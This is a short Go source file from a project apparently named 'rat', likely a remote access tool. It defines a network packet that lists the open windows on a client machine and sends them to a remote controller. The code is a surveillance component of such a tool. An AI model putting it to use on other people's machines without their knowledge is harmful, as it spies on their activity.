package main

import (
	"rat/client/windows"
	"rat/shared"
	"rat/shared/network/header"
)

type WindowsPacket struct {
	Windows []shared.Window `network:"send"`
}

func (packet WindowsPacket) Header() header.PacketHeader {
	return header.WindowsHeader
}

func (packet *WindowsPacket) Init() {
	windows.QueryWindows()

	packet.Windows = windows.Windows
}

func (packet WindowsPacket) OnReceive() error {
	Queue <- &WindowsPacket{}

	return nil
}
